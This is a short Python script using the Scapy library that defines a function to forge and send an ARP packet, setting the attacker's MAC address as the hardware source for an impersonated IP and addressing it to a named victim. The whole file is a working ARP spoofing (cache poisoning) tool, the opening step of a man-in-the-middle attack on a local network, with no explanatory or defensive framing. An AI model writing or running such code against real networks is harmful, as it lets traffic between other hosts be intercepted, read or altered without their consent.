from scapy.all import *

# spoof
def spoof(mac_attacker, mac_victim, ip_to_spoof, ip_victim, interface):
    arp = Ether() / ARP()
    # arp[Ether].src = mac_attacker
    # arp[Ether].dst = mac_victim
    arp[ARP].hwsrc = mac_attacker
    arp[ARP].psrc = ip_to_spoof
    arp[ARP].hwdst = mac_victim
    arp[ARP].pdst = ip_victim

    arp.show()

    sendp(arp, iface=interface)
